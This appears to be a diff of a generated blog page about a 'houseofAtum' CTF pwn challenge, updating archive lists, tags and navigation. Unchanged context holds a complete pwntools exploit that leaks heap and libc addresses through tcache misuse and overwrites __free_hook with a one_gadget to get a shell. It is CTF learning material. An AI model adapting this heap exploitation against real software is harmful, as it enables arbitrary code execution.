@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204222048520.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204222048521.png">
 <meta property="article:published_time" content="2022-04-22T12:51:03.213Z">
-<meta property="article:modified_time" content="2022-04-22T12:51:30.582Z">
+<meta property="article:modified_time" content="2022-05-26T16:39:17.202Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204222048505.png">
@@ -548,13 +548,17 @@
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204222048521.png" alt="image-20220422203325540"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.26.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the idx:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx,x</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the idx:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Clear?(y/n):&#x27;</span>)</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the idx:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">new(p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_addr:&quot;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(p64(heap_addr-<span class="number">0x20</span>))   <span class="comment">#malloc chunk0 from tcache</span></span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;a&#x27;</span>)                   <span class="comment">#malloc chunk1 and the heap_addr-0x20 to tcache</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)                <span class="comment">#fastbins</span></span><br><span class="line"></span><br><span class="line">new(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))      <span class="comment">#chunk 1:malloc the heap_addr-0x20 overlapping the chunk 0 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#now 0-&gt;heap-0x10  1-&gt;heap-0x20</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">main_arean=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x58</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arean:&#x27;</span>,<span class="built_in">hex</span>(main_arean))</span><br><span class="line"></span><br><span class="line">libc_base=main_arean-<span class="number">0x3DAC20</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xfcc6e</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(free_hook-<span class="number">0x10</span>)) </span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;A&#x27;</span>)              <span class="comment">#chunk 0 and free_hook-to-tcache</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)           <span class="comment">#fastbins     </span></span><br><span class="line">new(p64(one_gadget))  <span class="comment">#chunk 0 will malloc free_hook</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-
     </article>
     <!-- license -->
     
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/04/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/" title="延迟绑定">
+                    <div class="nextTitle">延迟绑定</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -846,7 +850,91 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1053,7 +1141,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 28
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -1067,6 +1155,30 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span>
+            <a class="archive-post-title" href="/2022/07/03/0ctf_2018_babystack/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2022/07/02/ret2dlresolve_x64/">ret2dlresolve_x64</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span>
+            <a class="archive-post-title" href="/2022/04/29/dl-runtime-resolve/">ret2dl-resolve</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2022/04/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/">延迟绑定</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">04/22</span>
@@ -1214,6 +1326,18 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
             <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
         </li>
     
@@ -1224,15 +1348,33 @@
         </li>
     
         
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
         <li class="archive-post-item">
-            <span class="archive-post-date">01/08</span>
-            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/04/25/srop/">srop</a>
         </li>
     
         
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
         <li class="archive-post-item">
-            <span class="archive-post-date">01/08</span>
-            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">非栈上的格式化字符串漏洞</a>
         </li>
     
     </div>
@@ -1240,6 +1382,16 @@
 
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="tcache">
+                <span class="iconfont-archer">&#xe606;</span>
+                tcache
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
         
             <span class="sidebar-tag-name" data-tags="unsorted bin attack">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -1259,16 +1411,6 @@
             <span class="sidebar-tag-name" data-tags="fastbin doule free">
                 <span class="iconfont-archer">&#xe606;</span>
                 fastbin doule free
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="tcache">
-                <span class="iconfont-archer">&#xe606;</span>
-                tcache
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
             </span>
         
     </div>
